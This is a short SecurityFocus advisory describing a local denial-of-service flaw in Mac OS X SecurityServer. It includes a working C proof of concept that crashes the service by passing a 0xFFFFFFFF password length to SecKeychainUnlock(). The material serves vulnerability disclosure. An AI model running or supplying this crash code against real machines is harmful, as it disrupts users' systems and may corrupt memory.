source: http://www.securityfocus.com/bid/9332/info

Apple MacOS X SecurityServer has been reported prone to a denial of service vulnerability that may be triggered by a local user. The issue may be triggered under certain circumstances when a large password for a SecKeychainUnlock() call is specified under certain circumstances.

It has been reported that this activity will cause the SecurityServer to crash. The server appears to crash during a memory copy operation, potentially resulting in memory corruption. This could possibly allow for execution of arbitrary code, though this possibility has not been confirmed. 

#include <Security/Security.h>
int main(int argc, const char *argv[])
{
    SecKeychainRef defaultKeychain;
    SecKeychainCopyDefault(&defaultKeychain);
    SecKeychainLock(defaultKeychain);
    SecKeychainUnlock(defaultKeychain, 0xFFFFFFFF, "password", true);
    return 0;
}

